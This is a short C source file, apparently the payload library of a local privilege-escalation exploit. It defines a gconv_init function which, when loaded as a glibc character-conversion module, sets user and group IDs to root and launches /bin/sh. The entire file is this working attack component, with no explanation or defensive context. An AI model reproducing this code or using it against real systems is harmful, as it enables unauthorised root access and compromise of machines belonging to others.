#include <stdlib.h>
#include <unistd.h>
#include <gconv.h>

void gconv(void) {}

int gconv_init(struct __gconv_step *step)
{

    char *args[] = {
        "/bin/sh", NULL};

    char *envs[] = {
        "PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin", NULL};

    setuid(0);
    setgid(0);

    execve(args[0], args, envs);

    return __GCONV_OK;
}
